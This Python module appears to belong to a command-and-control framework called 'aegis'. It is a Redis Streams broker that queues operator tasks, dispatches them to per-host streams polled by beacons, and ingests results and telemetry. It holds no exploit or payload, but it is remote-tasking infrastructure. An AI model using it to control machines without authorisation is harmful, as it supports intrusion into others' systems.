"""
c2/queue/broker.py

Redis Streams message broker — decoupled task, result, and telemetry pipelines.

Changes from previous version:
  - `asdict` removed from imports (was never used).
  - MessageBroker now implements async context manager (__aenter__/__aexit__)
    so callers can use `async with MessageBroker(url) as broker:`.
  - poll_node_tasks() uses a per-node consumer group instead of raw xrange,
    preventing duplicate delivery when multiple C2 nodes poll for the same
    node during a leader transition.
  - emit_alert() type-annotated as Optional[dict] = None (not dict = None).
  - read_telemetry() parameter renamed from `min` to `since` (was shadowing builtin).
  - consume_results() Callable typed with Awaitable return.
  - QueuedResult gets a default result_id factory so callers don't have to supply one.
"""

import asyncio
import json
import logging
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional

import redis.asyncio as aioredis

log = logging.getLogger("c2.queue")

# ── Stream names ─────────────────────────────────────────────────────────────
STREAM_TASKS_PENDING     = "aegis:tasks:pending"
STREAM_TASKS_NODE        = "aegis:tasks:node:{}"
STREAM_RESULTS_RAW       = "aegis:results:raw"
STREAM_RESULTS_PROCESSED = "aegis:results:done"
STREAM_TELEMETRY         = "aegis:telemetry"
STREAM_ALERTS            = "aegis:alerts"

# Consumer group names
GROUP_DISPATCHER       = "dispatchers"
GROUP_RESULT_PROCESSOR = "result-processors"
GROUP_TELEMETRY        = "telemetry-consumers"
# Per-node task groups prevent duplicate delivery during leader transitions.
# Group name is stable per host_id so any C2 node can consume the same group.
GROUP_NODE_TASKS_PREFIX = "node-tasks-"

MAX_STREAM_LEN    = 100_000
BLOCK_TIMEOUT_MS  = 1_000
TASK_TTL_SECONDS  = 3_600


@dataclass
class QueuedTask:
    task_id:     str
    host_id:     str
    task_type:   str
    payload:     Dict[str, Any]
    priority:    int   = 5
    created_at:  float = field(default_factory=time.time)
    expires_at:  float = field(default_factory=lambda: time.time() + TASK_TTL_SECONDS)
    operator_id: str   = "system"

    @classmethod
    def create(
        cls,
        host_id:    str,
        task_type:  str,
        payload:    dict,
        priority:   int = 5,
        operator_id: str = "system",
    ) -> "QueuedTask":
        return cls(
            task_id=str(uuid.uuid4()),
            host_id=host_id,
            task_type=task_type,
            payload=payload,
            priority=priority,
            operator_id=operator_id,
        )


@dataclass
class QueuedResult:
    task_id:     str
    host_id:     str
    status:      str        # "ok" | "error"
    output:      str
    result_id:   str   = field(default_factory=lambda: str(uuid.uuid4()))
    error:       str   = ""
    received_at: float = field(default_factory=time.time)


class MessageBroker:
    """
    Redis Streams message broker.

    Supports use as an async context manager:
        async with MessageBroker(redis_url) as broker:
            await broker.enqueue_task(task)
    """

    def __init__(self, redis_url: str) -> None:
        self._redis:       Optional[aioredis.Redis] = None
        self._redis_url    = redis_url
        self._consumer_id  = str(uuid.uuid4())[:8]

    # ── Context manager ───────────────────────────────────────────────────────

    async def __aenter__(self) -> "MessageBroker":
        await self.connect()
        return self

    async def __aexit__(self, *_: object) -> None:
        await self.close()

    async def connect(self) -> None:
        self._redis = await aioredis.from_url(self._redis_url, decode_responses=True)
        await self._ensure_consumer_groups()
        log.info(f"MessageBroker connected (consumer={self._consumer_id})")

    async def close(self) -> None:
        if self._redis:
            await self._redis.aclose()

    # ── Task enqueue ──────────────────────────────────────────────────────────

    async def enqueue_task(self, task: QueuedTask) -> str:
        """Publish a task to the pending queue. Returns the stream entry ID."""
        data = {
            "task_id":     task.task_id,
            "host_id":     task.host_id,
            "task_type":   task.task_type,
            "payload":     json.dumps(task.payload),
            "priority":    str(task.priority),
            "created_at":  str(task.created_at),
            "expires_at":  str(task.expires_at),
            "operator_id": task.operator_id,
        }
        entry_id = await self._redis.xadd(
            STREAM_TASKS_PENDING, data, maxlen=MAX_STREAM_LEN, approximate=True,
        )
        await self.emit_telemetry("task_enqueued", {
            "task_id":   task.task_id,
            "host_id":   task.host_id,
            "task_type": task.task_type,
        })
        log.debug(f"Enqueued {task.task_id[:8]} type={task.task_type} host={task.host_id[:8]}")
        return entry_id

    async def enqueue_tasks_bulk(self, tasks: List[QueuedTask]) -> List[str]:
        """Bulk enqueue using a pipeline."""
        pipe = self._redis.pipeline()
        for task in tasks:
            pipe.xadd(
                STREAM_TASKS_PENDING,
                {
                    "task_id":    task.task_id,
                    "host_id":    task.host_id,
                    "task_type":  task.task_type,
                    "payload":    json.dumps(task.payload),
                    "priority":   str(task.priority),
                    "created_at": str(task.created_at),
                    "expires_at": str(task.expires_at),
                    "operator_id": task.operator_id,
                },
                maxlen=MAX_STREAM_LEN,
                approximate=True,
            )
        return await pipe.execute()

    # ── Per-node task delivery ────────────────────────────────────────────────

    async def deliver_to_node(self, host_id: str, task: QueuedTask) -> str:
        """Route a task directly to the node's per-host stream."""
        stream = STREAM_TASKS_NODE.format(host_id)
        return await self._redis.xadd(
            stream,
            {
                "task_id":   task.task_id,
                "task_type": task.task_type,
                "payload":   json.dumps(task.payload),
                "expires_at": str(task.expires_at),
            },
            maxlen=1000,
            approximate=True,
        )

    async def poll_node_tasks(self, host_id: str, count: int = 10) -> List[QueuedTask]:
        """
        Drain pending tasks for a node using a consumer group so that two C2
        nodes cannot deliver the same task twice during a leader transition.

        The consumer group is named by host_id and is stable — any C2 node
        can join the same group and will receive non-overlapping messages.
        """
        stream     = STREAM_TASKS_NODE.format(host_id)
        group_name = f"{GROUP_NODE_TASKS_PREFIX}{host_id}"

        # Ensure the per-node consumer group exists
        try:
            await self._redis.xgroup_create(stream, group_name, id="0", mkstream=True)
        except aioredis.ResponseError as e:
            if "BUSYGROUP" not in str(e):
                raise

        entries = await self._redis.xreadgroup(
            group_name,
            self._consumer_id,
            {stream: ">"},
            count=count,
            block=0,  # non-blocking — beacons can't wait
        )
        if not entries:
            return []

        tasks:           List[QueuedTask] = []
        ids_to_ack:      List[str]        = []
        ids_expired:     List[str]        = []
        now = time.time()

        for _stream_name, messages in entries:
            for entry_id, data in messages:
                expires_at = float(data.get("expires_at", now + TASK_TTL_SECONDS))
                if now > expires_at:
                    ids_expired.append(entry_id)
                    continue
                try:
                    task = QueuedTask(
                        task_id=data["task_id"],
                        host_id=host_id,
                        task_type=data["task_type"],
                        payload=json.loads(data["payload"]),
                        expires_at=expires_at,
                    )
                    tasks.append(task)
                    ids_to_ack.append(entry_id)
                except (KeyError, json.JSONDecodeError) as e:
                    log.warning(f"Malformed task entry {entry_id}: {e}")
                    ids_expired.append(entry_id)

        # Acknowledge consumed entries in one round-trip
        all_processed = ids_to_ack + ids_expired
        if all_processed:
            await self._redis.xack(stream, group_name, *all_processed)

        return tasks

    # ── Result ingestion ──────────────────────────────────────────────────────

    async def publish_result(self, result: QueuedResult) -> str:
        """Publish a node result to the raw results stream."""
        data = {
            "result_id":   result.result_id,
            "task_id":     result.task_id,
            "host_id":     result.host_id,
            "status":      result.status,
            "output":      result.output[:65536],  # cap at 64 KB
            "error":       result.error,
            "received_at": str(result.received_at),
        }
        entry_id = await self._redis.xadd(
            STREAM_RESULTS_RAW, data, maxlen=MAX_STREAM_LEN, approximate=True,
        )
        await self.emit_telemetry("result_received", {
            "host_id": result.host_id,
            "task_id": result.task_id,
            "status":  result.status,
        })
        return entry_id

    async def consume_results(
        self,
        handler:    Callable[[QueuedResult], Awaitable[None]],
        batch_size: int = 50,
    ) -> None:
        """
        Continuously consume raw results from the shared consumer group.
        Multiple concurrent instances safely process non-overlapping messages.
        """
        while True:
            try:
                entries = await self._redis.xreadgroup(
                    GROUP_RESULT_PROCESSOR,
                    self._consumer_id,
                    {STREAM_RESULTS_RAW: ">"},
                    count=batch_size,
                    block=BLOCK_TIMEOUT_MS,
                )
                if not entries:
                    continue

                for _stream_name, messages in entries:
                    for entry_id, data in messages:
                        try:
                            result = QueuedResult(
                                result_id=data.get("result_id", str(uuid.uuid4())),
                                task_id=data["task_id"],
                                host_id=data["host_id"],
                                status=data["status"],
                                output=data.get("output", ""),
                                error=data.get("error", ""),
                                received_at=float(data.get("received_at", time.time())),
                            )
                            await handler(result)
                            await self._redis.xack(
                                STREAM_RESULTS_RAW, GROUP_RESULT_PROCESSOR, entry_id
                            )
                        except Exception as exc:
                            log.error(f"Result handler error (entry={entry_id}): {exc}")
                            # Leave un-acked so it is redelivered.

            except asyncio.CancelledError:
                break
            except Exception as exc:
                log.error(f"consume_results loop error: {exc}")
                await asyncio.sleep(1)

    # ── Dispatcher ────────────────────────────────────────────────────────────

    async def run_dispatcher(self) -> None:
        """
        Route tasks from the global pending stream to per-node streams.
        Only the cluster leader should run this.
        """
        log.info("Task dispatcher started")
        while True:
            try:
                entries = await self._redis.xreadgroup(
                    GROUP_DISPATCHER,
                    self._consumer_id,
                    {STREAM_TASKS_PENDING: ">"},
                    count=100,
                    block=BLOCK_TIMEOUT_MS,
                )
                if not entries:
                    continue

                for _stream_name, messages in entries:
                    for entry_id, data in messages:
                        try:
                            host_id = data["host_id"]
                            task = QueuedTask(
                                task_id=data["task_id"],
                                host_id=host_id,
                                task_type=data["task_type"],
                                payload=json.loads(data["payload"]),
                                priority=int(data.get("priority", 5)),
                                expires_at=float(
                                    data.get("expires_at", time.time() + TASK_TTL_SECONDS)
                                ),
                            )
                            await self.deliver_to_node(host_id, task)
                            await self._redis.xack(
                                STREAM_TASKS_PENDING, GROUP_DISPATCHER, entry_id
                            )
                            log.debug(f"Dispatched {task.task_id[:8]} → {host_id[:8]}")
                        except Exception as exc:
                            log.error(f"Dispatch error (entry={entry_id}): {exc}")

            except asyncio.CancelledError:
                break
            except Exception as exc:
                log.error(f"Dispatcher loop error: {exc}")
                await asyncio.sleep(1)

    # ── Telemetry ─────────────────────────────────────────────────────────────

    async def emit_telemetry(self, event_type: str, data: dict) -> None:
        """Emit a best-effort telemetry event."""
        try:
            payload = {
                "event": event_type,
                "ts":    str(time.time()),
                **{k: str(v) for k, v in data.items()},
            }
            await self._redis.xadd(
                STREAM_TELEMETRY, payload, maxlen=50_000, approximate=True,
            )
        except Exception as _e: log.debug("suppressed exception: %s", _e)  # telemetry is non-critical

    async def emit_alert(
        self,
        severity: str,
        message:  str,
        context:  Optional[dict] = None,
    ) -> None:
        """Emit a high-priority alert."""
        payload = {
            "severity": severity,
            "message":  message,
            "ts":       str(time.time()),
        }
        if context:
            payload["context"] = json.dumps(context)
        await self._redis.xadd(STREAM_ALERTS, payload, maxlen=10_000)

    async def read_telemetry(self, since: str = "0", count: int = 100) -> list:
        """Read telemetry events. `since` is a Redis stream ID (default: from start)."""
        entries = await self._redis.xrange(STREAM_TELEMETRY, min=since, count=count)
        return [{"id": eid, **data} for eid, data in entries]

    async def read_alerts(self, since: str = "0", count: int = 50) -> list:
        entries = await self._redis.xrange(STREAM_ALERTS, min=since, count=count)
        return [{"id": eid, **data} for eid, data in entries]

    async def queue_stats(self) -> dict:
        """Return queue depth stats for monitoring."""
        pipe = self._redis.pipeline()
        pipe.xlen(STREAM_TASKS_PENDING)
        pipe.xlen(STREAM_RESULTS_RAW)
        pipe.xlen(STREAM_TELEMETRY)
        pipe.xlen(STREAM_ALERTS)
        pending, raw, telemetry, alerts = await pipe.execute()
        return {
            "tasks_pending":   pending,
            "results_pending": raw,
            "telemetry_depth": telemetry,
            "alerts":          alerts,
        }

    # ── Setup ─────────────────────────────────────────────────────────────────

    async def _ensure_consumer_groups(self) -> None:
        groups = [
            (STREAM_TASKS_PENDING,    GROUP_DISPATCHER),
            (STREAM_RESULTS_RAW,      GROUP_RESULT_PROCESSOR),
            (STREAM_TELEMETRY,        GROUP_TELEMETRY),
        ]
        for stream, group in groups:
            try:
                await self._redis.xgroup_create(stream, group, id="0", mkstream=True)
            except aioredis.ResponseError as exc:
                if "BUSYGROUP" not in str(exc):
                    raise
